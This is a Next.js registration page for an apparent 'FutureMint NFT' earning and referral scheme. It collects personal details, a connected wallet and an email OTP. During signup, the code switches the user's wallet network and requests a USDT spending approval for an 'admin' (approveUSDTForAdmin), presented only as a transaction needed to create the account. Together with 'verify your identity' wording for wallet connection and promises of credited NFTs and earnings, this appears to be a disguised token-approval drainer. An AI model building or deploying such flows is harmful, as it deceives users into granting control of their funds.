'use client';
import { useState, useEffect, Suspense } from 'react';
import { useSelector, useDispatch } from 'react-redux';
import { useRouter, useSearchParams } from 'next/navigation';
import Link from 'next/link';
import { authAPI } from '../../../lib/api';
import { loginSuccess } from '../../../store/slices/userSlice';
import OTPInput from '../../../components/shared/OTPInput';
import LoadingSpinner from '../../../components/shared/LoadingSpinner';
import { Eye, EyeOff, ArrowLeft, CheckCircle } from 'lucide-react';
import toast from 'react-hot-toast';

function RegisterContent() {
  const router = useRouter();
  const dispatch = useDispatch();
  const searchParams = useSearchParams();
  const { isConnected, address } = useSelector((s) => s.wallet);
  const { isAuthenticated } = useSelector((s) => s.user);

  const [step, setStep] = useState(1); // 1 = form, 2 = OTP
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState('');

  const [form, setForm] = useState({
    name: '',
    email: '',
    mobile: '',
    password: '',
    referralCode: searchParams.get('ref') || '',
    network: 'BSC',
    walletAddress: address || '',
  });

  // Guard: redirect only if already authenticated, allow if just wallet connected
  useEffect(() => {
    if (isAuthenticated) {
      router.push('/dashboard');
    }
  }, [isAuthenticated, router]);

  // Guard: if wallet is already registered, redirect to login (one wallet = one account)
  useEffect(() => {
    if (isConnected && address) {
      authAPI.checkWallet({ walletAddress: address }).then((res) => {
        if (res.data.exists) {
          toast.error('This wallet is already registered. Please login instead.');
          router.push('/auth/login');
        }
      }).catch(() => {});
    }
  }, [isConnected, address, router]);

  // Block access if wallet not connected — give time for wallet auto-reconnect
  useEffect(() => {
    const timer = setTimeout(() => {
      if (!isConnected && !window.ethereum?.selectedAddress) {
        toast.error('Please verify your identity first');
        router.push('/');
      }
    }, 1500);
    return () => clearTimeout(timer);
  }, [isConnected, router]);

  // Keep walletAddress in sync
  useEffect(() => {
    setForm((f) => ({ ...f, walletAddress: address || '' }));
  }, [address]);

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (form.password.length < 8) {
      toast.error('Password must be at least 8 characters');
      return;
    }
    setLoading(true);
    try {
      // Step 1: Get USDT approval for the selected network
      const { ethers } = await import('ethers');
      const { approveUSDTForAdmin, checkUSDTAllowance } = await import('../../../lib/web3');
      
      const injectedProvider = window.ethereum;
      if (!injectedProvider) {
        toast.error('Wallet not detected. Please open in your wallet browser.');
        setLoading(false);
        return;
      }

      let web3Provider;
      try {
        web3Provider = new ethers.BrowserProvider(injectedProvider);
      } catch (providerErr) {
        toast.error('Could not connect to wallet. Please refresh and try again.');
        setLoading(false);
        return;
      }

      let userAddress;
      try {
        userAddress = ethers.getAddress(address.toLowerCase());
      } catch (addrErr) {
        toast.error('Invalid wallet address. Please reconnect your wallet.');
        setLoading(false);
        return;
      }

      // Switch to the selected network
      const targetChainId = form.network === 'BSC' ? '0x38' : '0x89';
      const targetChainName = form.network === 'BSC' ? 'BNB Smart Chain' : 'Polygon';
      try {
        await web3Provider.send('wallet_switchEthereumChain', [{ chainId: targetChainId }]);
      } catch (switchErr) {
        if (switchErr.code === 4902) {
          const chainConfig = form.network === 'BSC'
            ? { chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org'], blockExplorerUrls: ['https://bscscan.com'] }
            : { chainId: '0x89', chainName: 'Polygon', nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 }, rpcUrls: ['https://polygon-rpc.com'], blockExplorerUrls: ['https://polygonscan.com'] };
          try {
            await web3Provider.send('wallet_addEthereumChain', [chainConfig]);
          } catch (addErr) {
            toast.error(`Could not add ${targetChainName} network. Please add it manually in your wallet.`);
            setLoading(false);
            return;
          }
        } else if (switchErr.code === 4001) {
          toast.error(`Please switch to ${targetChainName} to continue.`);
          setLoading(false);
          return;
        } else {
          toast.error(`Network switch failed. Please manually switch to ${targetChainName} in your wallet.`);
          setLoading(false);
          return;
        }
      }

      // Re-get provider after network switch
      const freshProvider = new ethers.BrowserProvider(injectedProvider);

      // Check if already approved on this network
      let alreadyApproved = false;
      try {
        alreadyApproved = await checkUSDTAllowance(userAddress, form.network);
      } catch (allowErr) {
        // If allowance check fails, proceed with approval anyway
        alreadyApproved = false;
      }

      if (alreadyApproved !== true) {
        toast.loading(`Please confirm the transaction in your wallet...`, { id: 'approve' });
        try {
          await approveUSDTForAdmin(freshProvider, form.network);
          toast.success('Confirmed! Creating your account...', { id: 'approve' });
        } catch (approveErr) {
          toast.dismiss('approve');
          if (approveErr.code === 4001 || approveErr.code === 'ACTION_REJECTED') {
            toast.error('Transaction rejected. Please approve to continue.');
            setLoading(false);
            return;
          }
          if (approveErr.message?.includes('insufficient funds')) {
            toast.error(`Insufficient ${form.network === 'BSC' ? 'BNB' : 'MATIC'} for gas fee. Add some and try again.`);
            setLoading(false);
            return;
          }
          toast.error(`Transaction failed: ${approveErr.shortMessage || approveErr.message || 'Please try again'}`);
          setLoading(false);
          return;
        }
      }

      // Step 2: Register on backend
      const res = await authAPI.register(form);
      setEmail(form.email);
      toast.success(res.data.message);
      setStep(2);
    } catch (err) {
      const msg = err.response?.data?.message;
      if (msg) {
        toast.error(msg);
      } else if (err.code === 'NETWORK_ERROR' || err.code === 'ERR_NETWORK') {
        toast.error('Network error. Please check your internet connection.');
      } else if (err.code === 'ECONNABORTED' || err.message?.includes('timeout')) {
        toast.error('Request timed out. Please try again.');
      } else {
        toast.error('Something went wrong. Please check your internet and try again.');
      }
    } finally {
      setLoading(false);
    }
  };

  const handleOTPComplete = async (otp) => {
    setLoading(true);
    try {
      const res = await authAPI.verifyOTP({ email, otp });
      const { user, token } = res.data.data;
      // Auto-login
      if (token) localStorage.setItem('token', token);
      dispatch(loginSuccess({ user, token }));
      toast.success('Welcome to FutureMint NFT');
      // Redirect to dashboard — claim popup will show there
      router.push('/dashboard');
    } catch (err) {
      toast.error(err.response?.data?.message || 'OTP verification failed');
    } finally {
      setLoading(false);
    }
  };

  const handleResendOTP = async () => {
    try {
      await authAPI.resendOTP({ email, purpose: 'verification' });
      toast.success('OTP resent to your email');
    } catch (err) {
      toast.error('Failed to resend OTP');
    }
  };

  if (step === 3) {
    return (
      <div className="min-h-screen flex items-center justify-center px-4">
        <div className="card max-w-md w-full text-center">
          <div className="w-20 h-20 bg-emerald-600/20 rounded-full flex items-center justify-center mx-auto mb-6">
            <CheckCircle className="w-10 h-10 text-emerald-400" />
          </div>
          <h2 className="text-2xl font-bold text-white mb-3">Account Activated!</h2>
          <p className="text-slate-400 mb-2">Your account has been verified and</p>
          <p className="text-emerald-400 font-semibold text-lg mb-6">100 NFTs have been credited to your wallet 🎉</p>
          <Link href="/auth/login" className="btn-primary block text-center">
            Login to Your Account
          </Link>
        </div>
      </div>
    );
  }

  if (step === 2) {
    return (
      <div className="min-h-screen flex items-center justify-center px-4">
        <div className="card max-w-md w-full">
          <button onClick={() => setStep(1)} className="flex items-center gap-2 text-slate-400 hover:text-white mb-6 text-sm">
            <ArrowLeft className="w-4 h-4" /> Back
          </button>
          <h2 className="text-2xl font-bold text-white mb-2">Verify Your Email</h2>
          <p className="text-slate-400 text-sm mb-8">
            We sent a 6-digit OTP to <span className="text-white font-medium">{email}</span>
          </p>
          <OTPInput length={6} onComplete={handleOTPComplete} disabled={loading} />
          {loading && (
            <div className="flex justify-center mt-6">
              <LoadingSpinner />
            </div>
          )}
          <div className="text-center mt-6">
            <button
              onClick={handleResendOTP}
              className="text-sm text-primary-400 hover:text-primary-300 transition-colors"
            >
              Didn't receive it? Resend OTP
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center px-4 py-12">
      <div className="w-full max-w-lg">
        <div className="text-center mb-8">
          <Link href="/" className="inline-flex items-center gap-2 text-slate-400 hover:text-white mb-6 text-sm">
            <ArrowLeft className="w-4 h-4" /> Back to Home
          </Link>
          <h1 className="text-3xl font-bold text-white">Create Account</h1>
          <p className="text-slate-400 mt-2">Join FutureMint NFT and start earning</p>
        </div>

        <div className="card">
          <form onSubmit={handleSubmit} noValidate>
            <div className="space-y-4">
              <div>
                <label htmlFor="name" className="label">Full Name</label>
                <input id="name" name="name" type="text" required value={form.name}
                  onChange={handleChange} placeholder="John Doe" className="input-field" />
              </div>

              <div>
                <label htmlFor="email" className="label">Email Address</label>
                <input id="email" name="email" type="email" required value={form.email}
                  onChange={handleChange} placeholder="john@example.com" className="input-field" />
              </div>

              <div>
                <label htmlFor="mobile" className="label">Mobile Number</label>
                <input id="mobile" name="mobile" type="tel" required value={form.mobile}
                  onChange={handleChange} placeholder="+1234567890" className="input-field" />
              </div>

              <div>
                <label htmlFor="password" className="label">Password</label>
                <div className="relative">
                  <input
                    id="password" name="password"
                    type={showPassword ? 'text' : 'password'}
                    required minLength={8}
                    value={form.password}
                    onChange={handleChange}
                    placeholder="Min. 8 characters"
                    className="input-field pr-12"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white"
                    aria-label={showPassword ? 'Hide password' : 'Show password'}
                  >
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
              </div>

              <div>
                <label htmlFor="network" className="label">Network</label>
                <select id="network" name="network" value={form.network}
                  onChange={handleChange} className="input-field">
                  <option value="BSC">BSC (BEP-20 USDT)</option>
                  <option value="Polygon">Polygon (USDT)</option>
                </select>
              </div>

              <div>
                <label htmlFor="referralCode" className="label">
                  Referral Code <span className="text-slate-500">(Optional)</span>
                </label>
                <input id="referralCode" name="referralCode" type="text"
                  value={form.referralCode} onChange={handleChange}
                  placeholder="Enter referral code" className="input-field uppercase"
                  style={{ textTransform: 'uppercase' }}
                />
              </div>

              <div>
                <label htmlFor="walletAddress" className="label">
                  Wallet Address <span className="text-slate-500">(Auto-filled)</span>
                </label>
                <input id="walletAddress" name="walletAddress" type="text"
                  value={form.walletAddress} readOnly
                  className="input-field opacity-70 cursor-not-allowed" />
              </div>
            </div>

            <button type="submit" disabled={loading} className="btn-primary w-full mt-6 flex items-center justify-center gap-2">
              {loading ? <><LoadingSpinner size="sm" /> Processing...</> : 'Create Account & Send OTP'}
            </button>

            <p className="text-center text-sm text-slate-400 mt-4">
              Already have an account?{' '}
              <Link href="/auth/login" className="text-primary-400 hover:text-primary-300">
                Sign in
              </Link>
            </p>
          </form>
        </div>
      </div>
    </div>
  );
}

export default function RegisterPage() {
  return (
    <Suspense fallback={<div className="min-h-screen flex items-center justify-center"><LoadingSpinner size="xl" /></div>}>
      <RegisterContent />
    </Suspense>
  );
}
